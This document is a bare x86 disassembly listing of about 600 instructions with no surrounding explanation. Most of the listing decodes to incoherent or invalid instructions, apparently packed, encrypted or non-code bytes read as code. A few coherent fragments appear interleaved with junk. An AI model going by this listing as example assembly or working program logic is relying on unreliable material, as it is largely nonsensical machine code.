  42ae34:	mov    BYTE PTR [esi],dl
  42ae36:	into   
  42ae37:	mov    eax,ds:0x748c3a47
  42ae3c:	out    dx,al
  42ae3d:	xchg   ebx,eax
  42ae3e:	cdq    
  42ae3f:	ret    0xc43c
  42ae42:	jge    0x42aeb6
  42ae44:	push   cs
  42ae45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ae46:	and    DWORD PTR [eax-0x6f9ea15a],ecx
  42ae4c:	push   esi
  42ae4d:	gs inc edi
  42ae4f:	jmp    0xdbf63be4
  42ae54:	fs fs cmp al,0xa6
  42ae58:	inc    ebx
  42ae59:	jmp    0x42ae76
  42ae5b:	dec    esp
  42ae5c:	jp     0x42aedc
  42ae5e:	jbe    0x42ae92
  42ae60:	aam    0x1e
  42ae62:	mov    eax,ds:0x5239e60f
  42ae67:	mov    BYTE PTR [edx-0x1f8fd8c5],cl
  42ae6d:	outs   dx,DWORD PTR ds:[esi]
  42ae6e:	mov    BYTE PTR [ebp-0x6],bh
  42ae71:	(bad)  
  42ae72:	mov    dl,0xf7
  42ae74:	or     dl,BYTE PTR [edi-0x4a]
  42ae77:	fstp   QWORD PTR [bx+di]
  42ae7a:	imul   eax,esi,0x48
  42ae7d:	add    DWORD PTR [esi+0x2b],0xfffffff5
  42ae81:	and    al,0x32
  42ae83:	add    cl,bl
  42ae85:	sar    BYTE PTR [edi-0x74],1
  42ae88:	retf   0x1fbf
  42ae8b:	sbb    ecx,ebp
  42ae8d:	xchg   DWORD PTR [edx+0x4e4cdd60],ebp
  42ae93:	ds popf 
  42ae95:	cmp    DWORD PTR [edi+0x4d],esp
  42ae98:	dec    edi
  42ae99:	into   
  42ae9a:	mov    DWORD PTR [eax-0x72],ebx
  42ae9d:	test   esp,edi
  42ae9f:	xor    BYTE PTR [edx],al
  42aea1:	xor    BYTE PTR [ecx+0x5d3b85cb],dl
  42aea7:	push   es
  42aea8:	or     al,0xfd
  42aeaa:	fcomp  st(4)
  42aeac:	icebp  
  42aead:	or     DWORD PTR [ecx+0x38e3c868],0x7d74c65d
  42aeb7:	pop    ebx
  42aeb8:	fld    st(6)
  42aeba:	leave  
  42aebb:	fst    QWORD PTR [esi+edi*1-0x34]
  42aebf:	fnsave [edx+0x33a81408]
  42aec5:	retf   
  42aec6:	mov    DWORD PTR [esp+0x1c],edx
  42aeca:	cmp    DWORD PTR [esp+0x18],eax
  42aece:	jne    0x42b907
  42aed4:	jmp    0x42afb4
  42aed9:	jae    0x42aebe
  42aedb:	push   cs
  42aedc:	inc    ebx
  42aedd:	sahf   
  42aede:	out    dx,eax
  42aedf:	jg     0x42aed4
  42aee1:	rcl    esi,0x73
  42aee4:	or     eax,0xbf355dea
  42aee9:	sub    bh,ch
  42aeeb:	add    DWORD PTR [eax],eax
  42aeed:	ret    
  42aeee:	add    BYTE PTR [eax],al
  42aef0:	add    bh,ah
  42aef2:	sti    
  42aef3:	outs   dx,BYTE PTR ds:[esi]
  42aef4:	xchg   ecx,eax
  42aef5:	xchg   edi,eax
  42aef6:	mov    ds:0x94d00dd8,eax
  42aefb:	mov    dh,0x92
  42aefd:	push   eax
  42aefe:	test   bh,bl
  42af00:	aam    0xa4
  42af02:	mov    esi,0x169685cb
  42af07:	inc    esi
  42af08:	fdivp  st(6),st
  42af0a:	dec    ecx
  42af0b:	ins    BYTE PTR es:[edi],dx
  42af0c:	jmp    0x2d14ad92
  42af11:	mov    WORD PTR [ecx+0x7f],ds
  42af14:	fst    st(5)
  42af16:	int3   
  42af17:	pop    ebp
  42af18:	stc    
  42af19:	add    al,0xd1
  42af1b:	or     al,0xba
  42af1d:	or     eax,0xe4f84297
  42af22:	jg     0x42af6b
  42af24:	pop    eax
  42af25:	ret    0x72ae
  42af28:	dec    ecx
  42af29:	test   DWORD PTR [esi+0x69fe3e23],esi
  42af2f:	dec    eax
  42af30:	imul   esi,DWORD PTR [edi+0x4a],0xfffffff1
  42af34:	call   0x17197e5a
  42af39:	mov    esp,edi
  42af3b:	ret    
  42af3c:	or     bl,BYTE PTR [esi+0x7e4d5297]
  42af42:	mov    ds:0x3986a6d4,eax
  42af47:	outs   dx,BYTE PTR ds:[esi]
  42af48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42af49:	mov    cl,0x0
  42af4b:	rcl    DWORD PTR [edx-0x98e307e],1
  42af51:	fstp   TBYTE PTR [esi+0x6c87a568]
  42af57:	loope  0x42afc4
  42af59:	jae    0x42af20
  42af5b:	mov    ah,0x14
  42af5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42af5e:	stos   DWORD PTR es:[edi],eax
  42af5f:	inc    edi
  42af60:	cs fs adc ah,dh
  42af64:	test   al,0x23
  42af66:	or     BYTE PTR [esi],bl
  42af68:	repnz popa 
  42af6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42af6b:	mov    dh,BYTE PTR [ecx-0x5fd80ceb]
  42af71:	jge    0x42af0f
  42af73:	add    al,0x64
  42af75:	pop    ss
  42af76:	leave  
  42af77:	cmc    
  42af78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42af79:	push   ebx
  42af7a:	loope  0x42aefd
  42af7c:	call   0xde7:0xbb4cdae4
  42af83:	mov    fs,ecx
  42af85:	add    ebx,edx
  42af87:	mov    bl,0xcb
  42af89:	add    BYTE PTR [edi+ecx*4],bh
  42af8c:	fild   QWORD PTR [edi]
  42af8f:	push   ds
  42af90:	sub    al,0x33
  42af92:	retf   
  42af93:	loop   0x42af8d
  42af95:	inc    ebp
  42af96:	mov    ah,ah
  42af98:	js     0x42af25
  42af9a:	dec    edx
  42af9b:	mov    al,0x6d
  42af9d:	(bad)  
  42af9f:	and    bl,BYTE PTR [edi+0x138eea12]
  42afa5:	inc    esp
  42afa6:	idiv   BYTE PTR [ebp+0x3]
  42afa9:	mov    al,0xb4
  42afab:	stos   DWORD PTR es:[edi],eax
  42afac:	(bad)  
  42afae:	xchg   edx,eax
  42afaf:	mov    WORD PTR [edi],?
  42afb1:	fstp   QWORD PTR ds:0xfd13b71
  42afb7:	test   DWORD PTR [ebx+0x9],ecx
  42afba:	add    BYTE PTR [eax],al
  42afbc:	jmp    0x42b09c
  42afc1:	pop    ebx
  42afc2:	and    DWORD PTR [ebx],eax
  42afc4:	push   edi
  42afc5:	jnp    0x42b03e
  42afc7:	pop    edi
  42afc8:	sub    eax,0xbc2ce165
  42afcd:	dec    edx
  42afce:	hlt    
  42afcf:	push   edi
  42afd0:	ret    
  42afd1:	in     eax,dx
  42afd2:	std    
  42afd3:	add    DWORD PTR [eax],eax
  42afd5:	ret    
  42afd6:	add    BYTE PTR [eax],al
  42afd8:	add    BYTE PTR [eax-0x5e6cb10d],dh
  42afde:	out    0x52,eax
  42afe0:	push   esp
  42afe1:	sbb    al,0x26
  42afe3:	mov    DWORD PTR [ebx+0x12db215d],edi
  42afe9:	jl     0x42afd4
  42afeb:	jne    0x42afdc
  42afed:	xchg   edx,eax
  42afee:	retf   
  42afef:	push   esp
  42aff0:	sahf   
  42aff1:	jbe    0x42af75
  42aff3:	push   cs
  42aff4:	imul   edi,DWORD PTR [edi+ebx*2+0x57],0x884912c7
  42affc:	add    BYTE PTR es:[ebx-0x11f4ae46],al
  42b003:	test   BYTE PTR [ecx],ch
  42b005:	fsubr  DWORD PTR [esp+ebx*2-0x33d134db]
  42b00c:	jne    0x42afbc
  42b00e:	xlat   BYTE PTR ds:[ebx]
  42b00f:	in     eax,dx
  42b010:	pusha  
  42b011:	add    eax,0x6e451578
  42b016:	mul    eax
  42b018:	adc    DWORD PTR [ebx+eax*8+0x17bc03f0],esp
  42b01f:	sbb    ebp,ecx
  42b021:	das    
  42b022:	and    BYTE PTR [esi-0x3b],0x37
  42b026:	cmp    BYTE PTR [eax],bl
  42b028:	cwde   
  42b029:	mov    cl,0xd9
  42b02b:	dec    ebp
  42b02c:	and    al,0xae
  42b02e:	cmp    ah,BYTE PTR [ebp+0xe]
  42b031:	mov    esi,0x26ee7ab0
  42b036:	lahf   
  42b037:	ja     0x42afba
  42b039:	stc    
  42b03a:	(bad)  
  42b03b:	push   ds
  42b03c:	jbe    0x42afbf
  42b03e:	xchg   DWORD PTR [ebp+0x3b],ecx
  42b041:	das    
  42b042:	pop    es
  42b043:	xor    ecx,DWORD PTR [edx+0x7b9e05a3]
  42b049:	loope  0x42b013
  42b04b:	jge    0x42b067
  42b04d:	pop    edi
  42b04e:	dec    eax
  42b04f:	mov    dl,0x59
  42b051:	retf   0xace1
  42b054:	sub    BYTE PTR [ebx-0x268f28b4],dl
  42b05a:	mov    al,ds:0x2d831a6a
  42b05f:	add    BYTE PTR [edi],cl
  42b061:	nop
  42b062:	(bad)  
  42b063:	push   ds
  42b064:	mov    eax,ds:0x18acf3be
  42b069:	mov    gs,esp
  42b06b:	sub    ecx,DWORD PTR [ebp+ebx*1+0x6f611569]
  42b072:	jmp    0xe92e:0x3901592e
  42b079:	imul   BYTE PTR [eax-0x3ceb3c10]
  42b07f:	in     eax,0x47
  42b081:	sar    BYTE PTR [eax],1
  42b083:	dec    esi
  42b084:	test   ecx,0x163a54ff
  42b08a:	inc    edx
  42b08b:	cmp    DWORD PTR [edi+ebx*1],esp
  42b08e:	push   ebp
  42b08f:	xchg   edi,eax
  42b090:	fldenv [ebx+0x7d4ba2b6]
  42b096:	fcmovbe st,st(1)
  42b098:	fst    DWORD PTR [ecx-0x51]
  42b09b:	mov    ecx,0x182444c7
  42b0a0:	enter  0x4331,0x0
  42b0a4:	jmp    0x42b184
  42b0a9:	data16 add bh,ch
  42b0ac:	push   edx
  42b0ad:	std    
  42b0ae:	(bad)  
  42b0af:	out    dx,eax
  42b0b0:	ss cmp eax,0x6570b2c9
  42b0b6:	lock push ebx
  42b0b8:	add    dh,BYTE PTR [eax-0x3cfffe02]
  42b0be:	add    BYTE PTR [eax],al
  42b0c0:	add    cl,dh
  42b0c2:	jmp    0xce7a:0xc9792033
  42b0c9:	dec    esp
  42b0ca:	hlt    
  42b0cb:	out    0x56,al
  42b0cd:	xchg   DWORD PTR [ecx-0x7b98e17b],edi
  42b0d3:	test   BYTE PTR [eax-0x38e40168],dl
  42b0d9:	add    al,0x3e
  42b0db:	xor    DWORD PTR [edi-0x2a],ecx
  42b0de:	lea    ecx,[edx]
  42b0e0:	mov    ds:0xd3539766,al
  42b0e5:	sub    dl,BYTE PTR ds:0xeb501528
  42b0eb:	pop    edi
  42b0ec:	push   esi
  42b0ed:	sub    al,0x57
  42b0ef:	out    0x39,al
  42b0f1:	push   ecx
  42b0f2:	lahf   
  42b0f3:	sbb    DWORD PTR [ecx+0x39],0x205d7e83
  42b0fa:	and    al,0xb0
  42b0fc:	sahf   
  42b0fd:	dec    esi
  42b0fe:	in     al,dx
  42b0ff:	fs sti 
  42b101:	jge    0x42b15a
  42b103:	adc    DWORD PTR [eax],esp
  42b105:	dec    eax
  42b106:	ss inc ebx
  42b108:	stos   DWORD PTR es:[edi],eax
  42b109:	add    DWORD PTR [edi+eiz*8+0x20],esp
  42b10d:	pop    edi
  42b10e:	push   cs
  42b10f:	mov    bh,bh
  42b111:	sbb    al,0xf7
  42b113:	jb     0x42b0c9
  42b115:	(bad)  
  42b116:	xor    eax,DWORD PTR [esp+esi*1-0x26c7f17a]
  42b11d:	test   BYTE PTR ds:0xfad01b38,0x1e
  42b124:	cmp    BYTE PTR [edi],al
  42b126:	adc    BYTE PTR [eax],bl
  42b128:	sub    al,0x42
  42b12a:	leave  
  42b12b:	or     DWORD PTR [eax],edx
  42b12d:	arpl   WORD PTR [edi+ebp*2],ax
  42b130:	imul   DWORD PTR [eax+0x61]
  42b133:	into   
  42b134:	sub    DWORD PTR [eax+0x4c4e4069],0xbe4e2d60
  42b13e:	jmp    0x42b134
  42b140:	imul   ah
  42b142:	or     al,0x25
  42b144:	jl     0x42b17e
  42b146:	sbb    DWORD PTR [edx+0x5c635de1],eax
  42b14c:	repz dec ebx
  42b14e:	push   esp
  42b14f:	mov    al,0x45
  42b151:	mov    BYTE PTR [edi-0x5b32b788],0x67
  42b158:	imul   edi,DWORD PTR [ecx+0x6c6bf558],0xffffff9d
  42b15f:	inc    eax
  42b160:	push   es
  42b161:	sti    
  42b162:	call   0xf74e:0x5015d7ac
  42b169:	fucomi st,st(3)
  42b16b:	add    BYTE PTR [edi+0x1dba4e48],ah
  42b171:	mov    al,ds:0x8093f818
  42b176:	not    esp
  42b178:	popa   
  42b179:	mov    dl,0x96
  42b17b:	clc    
  42b17c:	mov    ds:0xbe999fcb,eax
  42b181:	mov    esp,0x448b7088
  42b186:	and    al,0x10
  42b188:	mov    ecx,DWORD PTR [esp+0x14]
  42b18c:	mov    ecx,DWORD PTR [esp+0x18]
  42b190:	mov    ecx,DWORD PTR [ecx+0xc]
  42b193:	jmp    0x42b273
  42b198:	fmul   QWORD PTR [esi+0x5]
  42b19b:	adc    BYTE PTR [edi+0x8cedd5b],dl
  42b1a1:	dec    ebx
  42b1a2:	adc    al,0x65
  42b1a4:	mov    esp,0x73de4757
  42b1a9:	inc    DWORD PTR [ecx]
  42b1ab:	add    bl,al
  42b1ad:	add    BYTE PTR [eax],al
  42b1af:	add    ch,dl
  42b1b1:	aam    0x7e
  42b1b3:	pop    ebp
  42b1b4:	push   edi
  42b1b5:	and    bl,0x19
  42b1b8:	test   BYTE PTR [ebp-0x4f],bh
  42b1bb:	das    
  42b1bc:	mov    esi,0x8fa32ede
  42b1c1:	ja     0x42b1aa
  42b1c3:	daa    
  42b1c4:	std    
  42b1c5:	popf   
  42b1c6:	xchg   ebp,eax
  42b1c7:	mov    esi,0x84c33bc9
  42b1cc:	dec    eax
  42b1cd:	adc    BYTE PTR [esi-0x5e5f8854],dh
  42b1d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b1d4:	sbb    ah,BYTE PTR [eax-0x5f]
  42b1d7:	and    eax,0x9643f3ac
  42b1dc:	repz mov ds:0x3993aa3,eax
  42b1e2:	mov    edx,0x548a655c
  42b1e7:	mov    dl,0x71
  42b1e9:	fisttp DWORD PTR ds:0x6ed1995a
  42b1ef:	ds test al,0x58
  42b1f2:	jae    0x42b190
  42b1f4:	loope  0x42b184
  42b1f6:	or     al,0x31
  42b1f8:	push   edi
  42b1f9:	adc    DWORD PTR [ebx],eax
  42b1fb:	pusha  
  42b1fc:	push   cs
  42b1fd:	les    ebp,FWORD PTR [esi-0x59e560bd]
  42b203:	fisub  DWORD PTR [ebp-0x1a]
  42b206:	xchg   ebx,eax
  42b207:	inc    edx
  42b208:	popf   
  42b209:	xor    eax,0xeefbf224
  42b20e:	mov    BYTE PTR [ebx],ch
  42b210:	mov    ds:0xf7701598,al
  42b215:	xor    al,0x45
  42b217:	mov    dl,BYTE PTR [ebp-0x668a291f]
  42b21d:	adc    al,0x4c
  42b21f:	jno    0x42b21c
  42b221:	stos   BYTE PTR es:[edi],al
  42b222:	popa   
  42b223:	and    eax,0xb96ad279
  42b228:	sub    eax,0xe1d10143
  42b22d:	sbb    eax,0x7705a59e
  42b232:	fistp  WORD PTR [esi-0x66]
  42b235:	mov    al,0x44
  42b237:	mov    bh,BYTE PTR [edi+0x44]
  42b23a:	add    bl,BYTE PTR [eax+0x73bb4b5b]
  42b240:	sub    al,0xd
  42b242:	jle    0x42b1fc
  42b244:	xor    cl,BYTE PTR [ebp+0x2d2269bd]
  42b24a:	add    DWORD PTR [ebx],eax
  42b24c:	mov    ecx,0xf5f949bf
  42b251:	xor    ecx,0xf4ddce71
  42b257:	or     esp,edx
  42b259:	jne    0x42b26c
  42b25b:	xchg   dh,ch
  42b25d:	out    dx,al
  42b25e:	gs shl dh,cl
  42b261:	jmp    0x531fc246
  42b266:	jge    0x42b2bc
  42b268:	jle    0x42b287
  42b26a:	scas   eax,DWORD PTR es:[edi]
  42b26b:	adc    eax,0x8690e99c
  42b270:	(bad)  
  42b271:	dec    esi
  42b272:	and    al,0x33
  42b274:	(bad)  
  42b275:	jmp    0x42b355
  42b27a:	push   edx
  42b27b:	xor    BYTE PTR [eax+ecx*2+0x66],al
  42b27f:	jl     0x42b2df
  42b281:	cmp    al,BYTE PTR [edx+0x340ddb55]
  42b287:	add    edx,DWORD PTR [edi+edi*4+0x36]
  42b28b:	add    BYTE PTR [edx],al
  42b28d:	add    bl,al
  42b28f:	add    BYTE PTR [eax],al
  42b291:	add    BYTE PTR [ebx+0x13],dl
  42b294:	inc    eax
  42b295:	data16 hlt 
  42b297:	sbb    BYTE PTR ds:0x4e860bc6,al
  42b29d:	jl     0x42b297
  42b29f:	push   0xf1167180
  42b2a4:	fld    QWORD PTR [ecx+0x6bf76fce]
  42b2aa:	test   BYTE PTR [esi-0x6c],al
  42b2ad:	sbb    eax,0x793b1292
  42b2b2:	pop    eax
  42b2b3:	test   al,0xc4
  42b2b5:	jg     0x42b32c
  42b2b7:	mov    eax,ds:0x6b7ab21f
  42b2bc:	xchg   ecx,eax
  42b2bd:	ins    BYTE PTR es:[edi],dx
  42b2be:	ja     0x42b28f
  42b2c0:	or     al,0xc4
  42b2c2:	mov    bh,bh
  42b2c4:	pop    eax
  42b2c5:	mov    ah,0x95
  42b2c7:	test   ecx,0x9904e8c6
  42b2cd:	mov    ebx,0xbfe3971e
  42b2d2:	scas   al,BYTE PTR es:[edi]
  42b2d3:	ret    
  42b2d4:	cdq    
  42b2d5:	scas   eax,DWORD PTR es:[edi]
  42b2d6:	loope  0x42b2a6
  42b2d8:	mov    bh,0xd7
  42b2da:	leave  
  42b2db:	imul   ecx,ecx,0x8ea9bf83
  42b2e1:	retf   0xdefe
  42b2e4:	data16 stc 
  42b2e6:	(bad)  
  42b2e8:	jae    0x42b30f
  42b2ea:	nop
  42b2eb:	adc    al,0xaa
  42b2ed:	out    0xf3,eax
  42b2ef:	and    ebx,DWORD PTR [ebx+0x4a]
  42b2f2:	add    ebx,DWORD PTR [esi-0x6e65c7bb]
  42b2f8:	jne    0x42b367
  42b2fa:	pop    eax
  42b2fb:	xchg   ecx,eax
  42b2fc:	out    0x7f,al
  42b2fe:	adc    esp,DWORD PTR [ebx+0x42]
  42b301:	lea    ebp,[edx+0x40b1697a]
  42b307:	push   cs
  42b308:	js     0x42b29e
  42b30a:	into   
  42b30b:	adc    bh,BYTE PTR [ecx+0x5725aab5]
  42b311:	shl    esi,1
  42b313:	imul   ebx,DWORD PTR [eax+0x7e1ab572],0x7b
  42b31a:	or     al,BYTE PTR [edx]
  42b31c:	pop    eax
  42b31d:	imul   edi,DWORD PTR [ebp-0x5c],0xffffffe2
  42b321:	jb     0x42b2c4
  42b323:	jb     0x42b2c9
  42b325:	or     al,0x84
  42b327:	dec    edi
  42b328:	jae    0x42b2dd
  42b32a:	inc    edx
  42b32b:	push   edx
  42b32c:	fistp  DWORD PTR [ebx]
  42b32e:	das    
  42b32f:	imul   esp,DWORD PTR [esi-0xb87e2],0xafbf2131
  42b339:	lods   eax,DWORD PTR ds:[esi]
  42b33a:	push   ds
  42b33b:	cld    
  42b33c:	lds    edx,FWORD PTR [esi]
  42b33e:	lea    esi,[ecx+0x2b6158d7]
  42b344:	cmp    bl,BYTE PTR [edx]
  42b346:	rcr    BYTE PTR [edi-0x2128a5b5],0xe6
  42b34d:	push   0x2c
  42b34f:	push   edi
  42b350:	xlat   BYTE PTR ds:[ebx]
  42b351:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b352:	sbb    eax,0x4d05fc41
  42b357:	bound  edi,QWORD PTR [eax-0x16fec467]
  42b35d:	fild   DWORD PTR [eax]
  42b35f:	add    BYTE PTR [eax],al
  42b361:	daa    
  42b362:	ror    ah,1
  42b364:	daa    
  42b365:	(bad)  
  42b366:	aas    
  42b367:	out    dx,eax
  42b368:	rol    al,1
  42b36a:	lock arpl si,bx
  42b36d:	xchg   BYTE PTR [eax-0x80],al
  42b370:	imul   edi,ecx,0xc3000200
  42b376:	add    BYTE PTR [eax],al
  42b378:	add    BYTE PTR [edx+0x56835134],bl
  42b37e:	mov    ch,0xd1
  42b380:	in     al,0x54
  42b382:	jno    0x42b343
  42b384:	adc    BYTE PTR [edx],ah
  42b386:	fnsave [ecx+0x7c]
  42b389:	add    eax,0xc2c98a85
  42b38e:	jb     0x42b351
  42b390:	retf   0x4dc2
  42b393:	adc    ecx,DWORD PTR [edx-0x49]
  42b396:	xor    al,0x71
  42b398:	xor    al,0xc0
  42b39a:	sbb    al,BYTE PTR [ecx-0x6d]
  42b39d:	daa    
  42b39e:	iret   
  42b39f:	sar    esp,cl
  42b3a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b3a2:	mov    ah,0xb8
  42b3a4:	cmp    DWORD PTR [esi],0xffffffab
  42b3a7:	jae    0x42b36f
  42b3a9:	cmp    ch,BYTE PTR [esi+0x794561b8]
  42b3af:	sub    BYTE PTR [edi-0x5a9a1ea0],dh
  42b3b5:	or     esp,edi
  42b3b7:	push   cs
  42b3b8:	push   ebx
  42b3b9:	sbb    bh,BYTE PTR [eax+ebp*4-0x44de1a5a]
  42b3c0:	inc    eax
  42b3c1:	int3   
  42b3c2:	cld    
  42b3c3:	test   edx,0xe642c332
  42b3c9:	in     al,dx
  42b3ca:	lds    edi,FWORD PTR [ecx-0x33]
  42b3cd:	or     al,0xc2
  42b3cf:	aam    0x5
  42b3d1:	sahf   
  42b3d2:	pop    ebx
  42b3d3:	test   eax,0x34269d27
  42b3d8:	enter  0xdcaf,0xeb
  42b3dc:	xor    BYTE PTR [eax+0x6a],dh
  42b3df:	sbb    esi,DWORD PTR [ebx+0x220de86b]
  42b3e5:	stos   BYTE PTR es:[edi],al
  42b3e6:	cdq    
  42b3e7:	retf   
  42b3e8:	in     al,0xa0
  42b3ea:	imul   ebp,DWORD PTR [eax+0x19],0xb35cc342
  42b3f1:	jns    0x42b444
  42b3f3:	inc    edi
  42b3f4:	dec    esp
  42b3f5:	iret   
  42b3f6:	cmp    eax,esi
  42b3f8:	sbb    BYTE PTR ds:0x9e581378,bl
  42b3fe:	aaa    
  42b3ff:	xchg   esp,eax
  42b400:	and    dl,al
  42b402:	mov    bh,0x91
  42b404:	aad    0xeb
  42b406:	pop    ds
  42b407:	jl     0x42b425
  42b409:	ja     0x42b480
  42b40b:	push   eax
  42b40c:	add    bl,BYTE PTR [ebx+0x14739df]
  42b412:	in     eax,dx
  42b413:	sub    al,0xdb
  42b415:	out    0x39,al
  42b417:	pop    eax
  42b418:	ds jbe 0x42b3df
  42b41b:	inc    esp
  42b41c:	retf   
  42b41d:	js     0x42b491
  42b41f:	addr16 std 
  42b421:	in     eax,dx
  42b422:	(bad)  
  42b423:	test   DWORD PTR [esi+0x65],0xbb4c4473
  42b42a:	mov    ah,0xc0
  42b42c:	or     DWORD PTR [ebx],esi
  42b42e:	mov    edi,0x9cfd8eed
  42b433:	pop    ebp
  42b434:	jmp    0x42b3e1
  42b436:	adc    ebx,eax
  42b438:	mov    edi,DWORD PTR [esi+0x7d]
  42b43b:	mov    ds:0x2c6850f,al
  42b440:	add    BYTE PTR [eax],al
  42b442:	mov    eax,DWORD PTR [esp+0x10]
  42b446:	mov    ecx,DWORD PTR [esp+0x14]
  42b44a:	xor    eax,esi
  42b44c:	jmp    0x42b52c
  42b451:	cmp    eax,0xfe9078bb
  42b456:	sar    ebp,cl
  42b458:	mov    edi,0xc4f72d3f
  42b45d:	sbb    edi,edi
  42b45f:	mov    WORD PTR ds:0x201bc,cs
  42b465:	ret    
  42b466:	add    BYTE PTR [eax],al
  42b468:	add    cl,bl
  42b46a:	arpl   bx,dx
  42b46c:	adc    DWORD PTR [edx-0x5e149dde],esp
  42b472:	jb     0x42b4ac
  42b474:	pop    edx
  42b475:	push   esi
  42b476:	fcomp  st(2)
  42b478:	inc    esp
  42b479:	sub    BYTE PTR [ecx+ecx*1+0xb77886b],al
  42b480:	loop   0x42b4d0
  42b482:	shl    DWORD PTR [edx+eiz*8],cl
  42b485:	les    ecx,FWORD PTR [edi]
  42b487:	mov    ah,0xfb
  42b489:	retf   
  42b48a:	in     al,dx
  42b48b:	xor    bh,BYTE PTR [esi-0x7f]
  42b48e:	inc    ecx
  42b48f:	outs   dx,BYTE PTR ds:[esi]
  42b490:	lock repz mov dl,0x7a
  42b494:	sti    
  42b495:	pop    edx
  42b496:	lods   eax,DWORD PTR ds:[esi]
  42b497:	js     0x42b50b
  42b499:	inc    esi
  42b49a:	or     eax,0x422593fc
  42b49f:	test   al,0x58
  42b4a1:	mov    bh,0x66
  42b4a3:	and    bh,BYTE PTR [edx-0x5af54243]
  42b4a9:	les    edi,FWORD PTR [ebp+0x1529a271]
  42b4af:	sub    ah,bh
  42b4b1:	shl    DWORD PTR [esi+0x5b4fa59c],cl
  42b4b7:	sbb    ah,ah
  42b4b9:	mov    ecx,0xce723e16
  42b4be:	ret    0x36f3
  42b4c1:	mov    DWORD PTR [ecx],edx
  42b4c3:	mov    edi,0x8e2f3558
  42b4c8:	rcr    eax,cl
  42b4ca:	add    BYTE PTR [esi],cl
  42b4cc:	cmp    esp,ecx
  42b4ce:	pop    ecx
  42b4cf:	cmp    edi,DWORD PTR [ecx-0x6c6877d5]
  42b4d5:	iret   
  42b4d6:	or     ecx,DWORD PTR ss:[edi]
  42b4d9:	add    eax,0x8cdcf94f
  42b4de:	xor    eax,DWORD PTR [edi+0x3c3caa5c]
  42b4e4:	fs mov esi,0x475e0aba
  42b4ea:	xchg   edi,eax
  42b4eb:	push   ss
  42b4ec:	das    
  42b4ed:	sub    DWORD PTR [esi+0x4ab5c724],esi
  42b4f3:	pop    esi
  42b4f4:	call   0x3e57:0xc011a12
  42b4fb:	inc    esp
  42b4fc:	mov    eax,ds:0x5bfbfa93
  42b501:	inc    ebp
  42b502:	and    BYTE PTR [ebp-0x7a],bl
  42b505:	jg     0x42b490
  42b507:	push   edx
  42b508:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b509:	dec    esi
  42b50a:	and    bl,BYTE PTR [eax-0x717da8ab]
  42b510:	(bad)  
  42b511:	ret    
  42b512:	aam    0xc9
  42b514:	push   es
  42b515:	dec    edi
  42b516:	jne    0x42b4a9
  42b518:	inc    esi
  42b519:	sahf   
  42b51a:	and    DWORD PTR [ecx],eax
  42b51c:	cmp    edi,DWORD PTR [ebp-0x35]
  42b51f:	mov    DWORD PTR ss:[edi-0x7c],ebp
  42b523:	cs push edi
  42b525:	stos   BYTE PTR es:[edi],al
  42b526:	mov    DWORD PTR [edi],edx
  42b528:	fnstcw WORD PTR [ebx+0x19]
  42b52b:	ins    BYTE PTR es:[edi],dx
  42b52c:	sub    eax,edi
  42b52e:	push   eax
  42b52f:	jmp    0x42b60f
  42b534:	inc    edi
  42b535:	dec    esp
  42b536:	jae    0x42b5ac
  42b538:	jnp    0x42b5b9
  42b53a:	inc    edi
  42b53b:	jg     0x42b5ba
  42b53d:	adc    BYTE PTR [esi+ebx*8+0x4e51fbe6],dl
  42b544:	jg     0x42b548
  42b546:	add    al,BYTE PTR [eax]
  42b548:	ret    
  42b549:	add    BYTE PTR [eax],al
  42b54b:	add    BYTE PTR [ebp+0x4c],bl
  42b54e:	xchg   ebx,eax
  42b54f:	mov    bh,0x68
  42b551:	outs   dx,DWORD PTR ds:[esi]
  42b552:	cmp    edi,DWORD PTR ds:0x3e30f7c2
  42b558:	popf   
  42b559:	jge    0x42b569
  42b55b:	or     ebx,eax
  42b55d:	ret    
  42b55e:	ja     0x42b5a1
  42b560:	and    DWORD PTR [ecx],esp
  42b562:	xchg   esp,eax
  42b563:	mov    ds:0xe72baac5,eax
  42b568:	mov    ebx,0x202f3057
  42b56d:	mov    bh,BYTE PTR [edx]
  42b56f:	loopne 0x42b52a
  42b571:	es je  0x42b545
  42b574:	ja     0x42b5da
  42b576:	(bad)  
  42b577:	mov    ebx,0xaeb703cc
  42b57c:	ja     0x42b5aa
  42b57e:	icebp  
  42b57f:	add    ebx,DWORD PTR [ebp-0xe]
  42b582:	and    al,0x96
  42b584:	repz push ecx
  42b586:	clc    
  42b587:	mov    dh,0x8b
  42b589:	inc    eax
  42b58a:	and    cl,BYTE PTR [esi+0x41]
  42b58d:	dec    ecx
  42b58e:	jae    0x42b605
  42b590:	retf   0x8dba
  42b593:	jnp    0x42b5e5
  42b595:	dec    ebp
  42b596:	xor    eax,0x8f7ab9ec
  42b59b:	push   edx
  42b59c:	xchg   esp,eax
  42b59d:	jmp    0x5481f4f8
  42b5a2:	nop
  42b5a3:	cmp    eax,0xcdf81a14
  42b5a8:	sbb    al,0x63
  42b5aa:	jmp    0xc863:0xe6cb03ba
  42b5b1:	mov    dh,0xe0
  42b5b3:	loopne 0x42b61a
  42b5b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b5b6:	push   ebp
  42b5b7:	outs   dx,DWORD PTR ds:[esi]
  42b5b8:	mov    edi,0x2ef49d1b
  42b5bd:	pusha  
  42b5be:	dec    ebx
  42b5bf:	(bad)  
  42b5c0:	push   cs
  42b5c1:	jle    0x42b59d
  42b5c3:	pop    ebp
  42b5c4:	aas    
  42b5c5:	and    bh,BYTE PTR ds:0xcebfd9c7
  42b5cb:	add    BYTE PTR [edx],0x9b
  42b5ce:	call   0xa1ac:0xd2eab75a
  42b5d5:	mov    ebp,0x3f35c5d6
  42b5da:	lea    ecx,[esp+eiz*8-0x3888dd5b]
  42b5e1:	enter  0xb1c2,0x33
  42b5e5:	outs   dx,DWORD PTR ds:[esi]
  42b5e6:	loop   0x42b582
  42b5e8:	ss jo  0x42b57c
  42b5eb:	dec    ebx
  42b5ec:	jae    0x42b633
  42b5ee:	jmp    0x42b613
  42b5f0:	mov    al,BYTE PTR [edx+0x5b]
